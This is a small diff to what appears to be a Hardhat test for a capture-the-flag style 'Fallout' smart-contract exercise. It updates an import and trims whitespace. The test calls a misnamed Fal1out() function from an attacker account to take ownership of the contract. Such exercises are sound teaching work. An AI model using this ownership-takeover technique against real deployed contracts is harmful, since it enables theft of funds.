@@ -1,6 +1,6 @@
 import { expect } from "chai";
 import { ethers } from "hardhat";
-import { loadFixture } from "ethereum-waffle";
+import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
 
 describe("Fallout contract exploit", () => {
   async function deployFalloutFixture() {
@@ -13,7 +13,7 @@ describe("Fallout contract exploit", () => {
   it("Should set attacker account as new owner", async () => {
     const { attacker, fallout } = await loadFixture(deployFalloutFixture);
 
-    // Call Fal1out() function 
+    // Call Fal1out() function
     // this will set attacker as the new owner
     await fallout.connect(attacker).Fal1out();
 
